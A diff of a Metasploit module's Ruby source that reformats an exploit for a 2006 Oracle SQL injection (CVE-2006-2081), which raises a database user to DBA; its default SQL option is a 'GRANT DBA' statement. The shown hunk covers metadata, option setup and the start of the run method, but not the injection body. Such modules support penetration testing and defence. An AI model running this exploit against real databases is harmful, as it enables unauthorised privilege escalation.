@@ -7,35 +7,39 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::ORACLE
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Oracle DB SQL Injection via DBMS_EXPORT_EXTENSION',
-      'Description'    => %q{
-        This module will escalate an Oracle DB user to DBA by exploiting a
-        sql injection bug in the DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_METADATA package.
+    super(
+      update_info(
+        info,
+        'Name' => 'Oracle DB SQL Injection via DBMS_EXPORT_EXTENSION',
+        'Description' => %q{
+          This module will escalate an Oracle DB user to DBA by exploiting a
+          sql injection bug in the DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_METADATA package.
 
-        Note: This module has been tested against 9i, 10gR1 and 10gR2.
-      },
-      'Author'         => [ 'MC' ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+          Note: This module has been tested against 9i, 10gR1 and 10gR2.
+        },
+        'Author' => [ 'MC' ],
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'CVE', '2006-2081' ],
           [ 'OSVDB', '25002' ],
           [ 'BID', '17699' ],
           [ 'URL', 'http://www.red-database-security.com/exploits/oracle-sql-injection-oracle-dbms_export_extension.html' ],
         ],
-      'DisclosureDate' => '2006-04-26'))
+        'DisclosureDate' => '2006-04-26'
+      )
+    )
 
-      register_options(
-        [
-          OptString.new('SQL', [ false, 'SQL to execute.', "GRANT DBA TO #{datastore['DBUSER']}"]),
-        ])
+    register_options(
+      [
+        OptString.new('SQL', [ false, 'SQL to execute.', "GRANT DBA TO #{datastore['DBUSER']}"]),
+      ]
+    )
   end
 
   def run
     return if not check_dependencies
 
-    name  = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
+    name = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
     rand1 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
     rand2 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
     rand3 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
